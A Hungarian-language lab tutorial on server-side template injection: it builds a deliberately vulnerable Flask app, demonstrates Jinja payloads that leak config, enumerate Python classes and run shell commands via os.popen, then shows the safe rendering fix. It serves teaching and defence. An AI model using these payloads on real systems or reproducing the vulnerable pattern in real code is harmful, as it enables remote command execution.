# Server Side Template Injection (SSTI)

## Rendszerterv

Az SSTI-t egy egyszerű (egyetlen fájlból álló) Flash webalkalmazáson
keresztül fogjuk megvizsgálni. Ehhez szükségünk van a Fask csomagra,
amit egy `venv`-ben fogunk telepíteni. 

## A webszerver telepítése

A webszervert a következő paranccsal tudjuk telepíteni:

```bash
sudo apt install python3-venv
python3 -m venv ssti
cd ssti
. bin/activate
pip install flask
```

Az `app.py` fájl fogja tartalmazni a (szándékosan sérülékeny) webalkalmazást. Ezt a
legegyszerűbben úgy tölthetjük fel tartalommal, hogy a következő parancsot kiadva...

```bash
cat > app.py
```

... a következő kódot a vágólapra helyezzük...

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body>
    <h1>SSTI Demo</h1>
    <form method="POST" action="/hello">
        Name:<br><br>
        <input type="text" name="name" size="40" required>
        <br><br>
        <button type="submit">Submit</button>
    </form>
</body>
</html>
    """

@app.route("/hello", methods=["POST"])
def greet():
    name = request.form.get("name", "Guest")
    template = f"Hello {name}!"

    return render_template_string(template)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
```

... majd egy üres sorban Ctrl-D-t ütünk. (Ezt csak üres sorban tehetjük meg, tehát
üssünk előtte egy entert, ha szükséges.)

A programot a következő paranccsal tudjuk teszt céllal indítani. Fontos, hogy a fentebb
aktivált venv-ben legyünk. (Egy webalkalmazás indítása éles környezetben nem így célszerű,
de ez túlmutat a sérülékenység leírásán.)

```bash
python app.py
```

A webalkalmazás az 5000-es porton érhető el. Próbáljunk különböző szövegeket írni a beviteli
mezőbe. A webalkalmazás szó szerint azt írja ki, amit beírtunk.

## A támadás menete

Kivéve akkor, ha valami
olyat írunk be, amit a template engine értelmez. Például:

```
{{7*7}}
```

Erre 49 lesz az eredmény, mivel a `{{` és `}}` közti részt a template engine
értelmezi. Hasonló módon hozzáférhetünk például konfigurációs adatokhoz:

```
{{config}}
```

Illetve bizonyos objektumokból kiindulva a rendszer egyes osztályaihoz...

```
{{ ''.__class__ }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
```

Ezeken keresztül pedig meghívhatunk függvényeket.

Egy másik megközelítéssel például rendszer (shell) parancsok futtatására is lehetőségünk van.

```
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

## Védekezés

Maga a template engine alapvetően jó, csak a használata nem volt az. A helyes használata a következő:

```python
return render_template_string("Hello {{ name }}!", name=name)
```

